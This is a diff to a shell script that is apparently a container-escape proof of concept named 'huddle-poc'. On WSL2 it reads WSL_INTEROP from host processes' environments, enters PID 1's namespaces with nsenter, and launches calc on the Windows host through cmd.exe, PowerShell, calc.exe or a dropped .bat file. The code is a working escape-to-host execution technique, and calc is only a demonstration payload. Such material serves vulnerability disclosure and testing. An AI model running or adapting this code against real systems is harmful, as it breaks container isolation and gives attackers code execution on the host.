@@ -87,20 +87,37 @@ fi
 # Detect WSL2 vs native Linux
 if [ -f /host/mnt/c/Windows/System32/cmd.exe ] || grep -qi microsoft /host/proc/version 2>/dev/null; then
   echo "[*] WSL2 detected — launching calc via Windows interop"
-  # Method A: nsenter + cmd.exe (interop available in host namespace)
-  nsenter -t 1 -m -u -i -n -p -- /mnt/c/Windows/System32/cmd.exe /c start calc 2>/dev/null \
-    && echo "[+] calc launched (nsenter+cmd.exe)" && exit 0
-  # Method B: chroot into host rootfs where binfmt_misc resolves PE binaries
-  chroot /host /mnt/c/Windows/System32/cmd.exe /c start calc 2>/dev/null \
-    && echo "[+] calc launched (chroot+cmd.exe)" && exit 0
-  # Method C: powershell
-  nsenter -t 1 -m -u -i -n -p -- /mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -Command "Start-Process calc" 2>/dev/null \
+  # WSL2->Windows interop only works when WSL_INTEROP (pointing at the per-session
+  # socket /run/WSL/<id>_interop) is present in the launching environment. nsenter
+  # RESETS the environment, so a bare `nsenter -- cmd.exe` silently no-ops even
+  # though the escape itself succeeded. pidmode:host gives us the host PID ns, so
+  # harvest a live WSL_INTEROP value from any host process and pass it through.
+  interop=""
+  for e in /proc/*/environ; do
+    v=$(tr "\0" "\n" < "$e" 2>/dev/null | sed -n "s/^WSL_INTEROP=//p" | head -1)
+    [ -n "$v" ] && { interop="$v"; break; }
+  done
+  if [ -n "$interop" ]; then
+    echo "[*] harvested WSL_INTEROP=$interop"
+  else
+    echo "[!] no WSL_INTEROP in host procs — interop launch may still no-op"
+  fi
+  # runwin <interpreter> [args...] — enter host mount/pid ns with interop restored.
+  # cwd forced onto a drvfs path so cmd.exe does not bail on a UNC working dir.
+  runwin() { nsenter -t 1 -m -u -i -n -p -- env WSL_INTEROP="$interop" "$@"; }
+
+  # Method A: cmd.exe start calc
+  runwin /bin/sh -c "cd /mnt/c && exec /mnt/c/Windows/System32/cmd.exe /c start calc" 2>/dev/null \
+    && echo "[+] calc launched (cmd.exe start)" && exit 0
+  # Method B: powershell Start-Process
+  runwin /mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -NoProfile -Command "Start-Process calc" 2>/dev/null \
     && echo "[+] calc launched (powershell)" && exit 0
-  chroot /host /mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -Command "Start-Process calc" 2>/dev/null \
-    && echo "[+] calc launched (chroot+powershell)" && exit 0
-  # Method D: write a bat and schedule it
+  # Method C: direct Win32 calc launcher stub
+  runwin /mnt/c/Windows/System32/calc.exe 2>/dev/null \
+    && echo "[+] calc launched (calc.exe)" && exit 0
+  # Method D: write a bat and run it via cmd
   echo "calc" > /host/mnt/c/Users/Public/huddle-poc.bat
-  nsenter -t 1 -m -u -i -n -p -- /mnt/c/Windows/System32/cmd.exe /c "C:\\Users\\Public\\huddle-poc.bat" 2>/dev/null \
+  runwin /mnt/c/Windows/System32/cmd.exe /c "C:\\Users\\Public\\huddle-poc.bat" 2>/dev/null \
     && echo "[+] calc launched (bat)" && exit 0
   echo "[!] all WSL2 calc methods failed — check proof file instead: $P"
 else
